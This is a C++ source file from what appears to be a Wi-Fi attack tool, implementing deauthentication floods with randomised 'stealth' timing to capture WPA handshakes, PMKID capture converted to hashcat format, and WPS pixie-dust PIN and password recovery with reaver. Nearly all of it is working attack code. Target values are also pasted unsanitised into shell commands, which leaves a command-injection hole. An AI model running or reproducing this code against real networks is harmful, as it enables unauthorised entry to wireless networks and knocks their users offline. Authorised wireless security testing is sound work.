#include "Attacker.h"
#include "utils/Logger.h"
#include "utils/NetUtils.h"
#include <chrono>
#include <thread>
#include <cstdlib>
#include <filesystem>
#include <random>

Attacker::Attacker(const std::string& iface)
    : m_iface(iface), m_pkt(iface) {}

Attacker::~Attacker() { stopAttack(); }

void Attacker::stopAttack() {
    m_running = false;
    if (m_thread.joinable()) m_thread.join();
    std::system("pkill -f hcxdumptool 2>/dev/null");
    std::system("pkill -f reaver 2>/dev/null");
    std::system("pkill -f bully 2>/dev/null");
}

void Attacker::attackHandshake(const NetworkInfo& net, const StealthConfig& stealth) {
    if (m_running) stopAttack();
    m_running = true;
    m_thread = std::thread(&Attacker::handshakeWorker, this, net, stealth);
}

void Attacker::attackPMKID(const NetworkInfo& net) {
    if (m_running) stopAttack();
    m_running = true;
    m_thread = std::thread(&Attacker::pmkidWorker, this, net);
}

void Attacker::attackWPS(const NetworkInfo& net) {
    if (m_running) stopAttack();
    m_running = true;
    m_thread = std::thread(&Attacker::wpsWorker, this, net);
}

void Attacker::handshakeWorker(NetworkInfo net, StealthConfig stealth) {
    LOG_INFO("Starting handshake capture for " + net.ssid + " [" + net.bssid + "]");

    std::string capFile = "/tmp/wifisec_hs_" + net.bssid;
    // Replace colons for filename
    for (auto& c : capFile) if (c == ':') c = '_';

    // Start airodump focused on target
    std::string airo = "airodump-ng " + m_iface
                     + " --bssid " + net.bssid
                     + " --channel " + std::to_string(net.channel)
                     + " --write " + capFile
                     + " --output-format pcap 2>/dev/null &";
    std::system(airo.c_str());
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // Set channel
    NetUtils::setChannel(m_iface, net.channel);

    // Open packet engine for deauth injection
    PacketEngine pe(m_iface);
    pe.open();

    std::mt19937 rng(std::random_device{}());
    int attempts = 0;

    while (m_running && attempts < 20) {
        int delay = stealth.deauth_delay_ms;
        if (stealth.random_intervals) {
            std::uniform_int_distribution<int> d(delay, delay * 3);
            delay = d(rng);
        }

        pe.sendDeauth(net.bssid, "", stealth.rate_limit_deauth ? 3 : 10,
                      stealth.rate_limit_deauth ? 200 : 50);

        std::this_thread::sleep_for(std::chrono::milliseconds(delay));

        std::string capPcap = capFile + "-01.cap";
        if (waitForHandshake(capPcap, 0)) {
            AttackResult res;
            res.type           = AttackType::HANDSHAKE;
            res.status         = AttackStatus::SUCCESS;
            res.target_bssid   = net.bssid;
            res.handshake_file = capPcap;
            res.message        = "Handshake captured for " + net.ssid;
            LOG_INFO(res.message);
            m_running = false;
            if (m_cb) m_cb(res);
            return;
        }
        attempts++;
    }

    AttackResult res;
    res.type         = AttackType::HANDSHAKE;
    res.status       = AttackStatus::FAILED;
    res.target_bssid = net.bssid;
    res.message      = "Handshake capture failed after " + std::to_string(attempts) + " attempts";
    LOG_WARN(res.message);
    m_running = false;
    if (m_cb) m_cb(res);
}

void Attacker::pmkidWorker(NetworkInfo net) {
    LOG_INFO("Starting PMKID attack on " + net.ssid);
    std::string outFile = "/tmp/wifisec_pmkid_" + net.bssid;
    for (auto& c : outFile) if (c == ':') c = '_';

    std::string cmd = "hcxdumptool -i " + m_iface
                    + " --filterlist_ap=" + net.bssid
                    + " --filtermode=2 -o " + outFile + ".pcapng"
                    + " --enable_status=1 2>/dev/null &";
    std::system(cmd.c_str());

    for (int i = 0; i < 30 && m_running; i++) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        if (waitForPMKID(outFile + ".pcapng", 0)) {
            // Convert to hashcat format
            std::string hashFile = outFile + ".hash";
            std::system(("hcxpcapngtool -o " + hashFile + " " + outFile + ".pcapng 2>/dev/null").c_str());

            AttackResult res;
            res.type           = AttackType::PMKID;
            res.status         = AttackStatus::SUCCESS;
            res.target_bssid   = net.bssid;
            res.handshake_file = hashFile;
            res.message        = "PMKID captured for " + net.ssid;
            LOG_INFO(res.message);
            std::system("pkill -f hcxdumptool 2>/dev/null");
            m_running = false;
            if (m_cb) m_cb(res);
            return;
        }
    }

    std::system("pkill -f hcxdumptool 2>/dev/null");
    AttackResult res;
    res.type         = AttackType::PMKID;
    res.status       = AttackStatus::FAILED;
    res.target_bssid = net.bssid;
    res.message      = "PMKID capture failed";
    m_running = false;
    if (m_cb) m_cb(res);
}

void Attacker::wpsWorker(NetworkInfo net) {
    LOG_INFO("Starting WPS pixie-dust on " + net.ssid);
    std::string cmd = "reaver -i " + m_iface
                    + " -b " + net.bssid
                    + " -c " + std::to_string(net.channel)
                    + " -K 1 -f -N 2>&1 | tee /tmp/wifisec_wps.log";
    std::system(cmd.c_str());

    // Check if PIN/password found
    std::string log = NetUtils::runCommand("grep -i 'WPS PIN\\|WPA PSK' /tmp/wifisec_wps.log 2>/dev/null");
    AttackResult res;
    res.type         = AttackType::WPS_PIXIE;
    res.target_bssid = net.bssid;
    if (!log.empty()) {
        res.status  = AttackStatus::SUCCESS;
        res.message = log;
        res.password = log;
    } else {
        res.status  = AttackStatus::FAILED;
        res.message = "WPS pixie-dust failed";
    }
    m_running = false;
    if (m_cb) m_cb(res);
}

bool Attacker::waitForHandshake(const std::string& capFile, int timeoutSec) {
    if (!std::filesystem::exists(capFile)) return false;
    std::string out = NetUtils::runCommand(
        "aircrack-ng " + capFile + " 2>/dev/null | grep -c 'handshake'");
    try { return std::stoi(out) > 0; } catch (...) { return false; }
}

bool Attacker::waitForPMKID(const std::string& capFile, int) {
    if (!std::filesystem::exists(capFile)) return false;
    std::string out = NetUtils::runCommand(
        "hcxpcapngtool " + capFile + " 2>&1 | grep -c 'PMKID'");
    try { return std::stoi(out) > 0; } catch (...) { return false; }
}
